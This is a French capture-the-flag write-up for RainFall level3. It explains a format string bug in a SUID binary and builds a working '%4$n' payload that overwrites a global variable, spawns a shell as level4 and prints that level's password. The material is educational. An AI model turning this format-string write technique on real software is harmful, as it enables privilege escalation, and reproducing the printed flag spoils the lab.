# RainFall CTF - Level3

## Reconnaissance

### Fichier trouvé
```bash
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5403 Mar  6  2016 level3
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level4` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level4`

## Analyse statique avec Ghidra

### Fonction main
```c
void main(void) {
  v();
  return;
}
```

### Fonction v (vulnérable)
```c
void v(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);              // ← VULNÉRABILITÉ FORMAT STRING
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}
```

## Analyse des vulnérabilités

### Format String Vulnerability
- **Ligne dangereuse** : `printf(local_20c);`
- **Problème** : Devrait être `printf("%s", local_20c);`
- **Impact** : L'input utilisateur contrôle le format de `printf()`

### Condition de victoire
```c
if (m == 0x40) {  // Si m vaut 64 en décimal
    system("/bin/sh");
}
```

Il faut modifier la variable globale `m` pour qu'elle vaille `0x40` (64 en décimal).

## Reconnaissance de la variable m

### Localisation avec GDB
```bash
gdb ./level3
(gdb) b main
(gdb) p m                    # Affiche m = 0
(gdb) info variables         # Affiche l'adresse de m
```

**Résultat** : Variable `m` située à l'adresse `0x0804988c`

## Exploitation par Format String

### Test de la vulnérabilité
Localisation de l'adresse cible sur la pile :
```bash
python -c "print('\x8c\x98\x04\x08' + '0x%x ' * 20)" | ./level3
```

**Sortie :**
```
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x78257830 0x25783020 ...
```

L'adresse `0x804988c` (variable `m`) apparaît à la **4ème position** sur la pile.

### Mécanisme du spécificateur %n

Le spécificateur `%n` écrit le nombre de caractères imprimés jusqu'à ce point à l'adresse spécifiée.

**Exemples de syntaxe :**
```c
printf("%s", arg1);      // Format normal
printf("%4$s", arg4);    // Utilise le 4ème argument au lieu du 1er
printf("%n", &var);      // Écrit à l'adresse fournie
printf("%4$n", &var);    // Écrit à la 4ème adresse sur la pile
```

### Construction du payload

**Objectif :** Écrire 64 dans la variable `m`

**Structure du payload :**
1. **Adresse de m** : `\x8c\x98\x04\x08` (4 octets)
2. **Padding** : `'A' * 60` (60 octets)
3. **Total** : 64 caractères imprimés
4. **Format string** : `%4$n` (écrit 64 à la 4ème position)

**Note sur l'échappement :** Dans le shell, le `$` doit être échappé : `%4\$n`

### Payload final
```bash
(python -c "print('\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n')"; cat) | ./level3
```

## Séquence d'exécution

1. `fgets()` lit notre payload dans `local_20c`
2. `printf(local_20c)` interprète notre format string :
   - Affiche l'adresse et les 'A' (64 caractères total)
   - `%4$n` écrit 64 à l'adresse `0x804988c` (variable `m`)
3. La condition `if (m == 0x40)` devient vraie
4. Le message "Wait what?!" s'affiche
5. `system("/bin/sh")` lance un shell avec les privilèges de level4

## Exploitation réussie

```bash
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n')"; cat) | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## Résultats

### Flag obtenu
```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

### Accès niveau suivant
- **Utilisateur** : `level4`
- **Prochain challenge** : `/home/user/level4/`

## Notes techniques

- **Type de vulnérabilité** : Format String Vulnerability
- **Technique d'exploitation** : Écriture mémoire arbitraire via `%n`
- **Architecture** : x86 (32-bit)
- **Concept clé** : Contrôle des spécificateurs de format dans `printf()`
- **Spécificateurs utilisés** :
  - `%x` : Leak mémoire (pour reconnaissance)
  - `%4$n` : Écriture à la 4ème position de la pile
- **Calcul précis** : 64 caractères imprimés = valeur écrite par `%n`
- **Difficulité** : Intermédiaire - Introduction aux format strings

## Concepts techniques appris

### Format String Vulnerability
- Contrôle des spécificateurs de format
- Écriture mémoire arbitraire avec `%n`
- Positional arguments (`%x$`)

### Reconnaissance mémoire
- Leak d'adresses avec `%x`
- Localisation de variables sur la pile
- Calcul précis du nombre de caractères

Cette exploitation introduit les concepts fondamentaux des format string attacks, technique largement utilisée en exploitation binaire.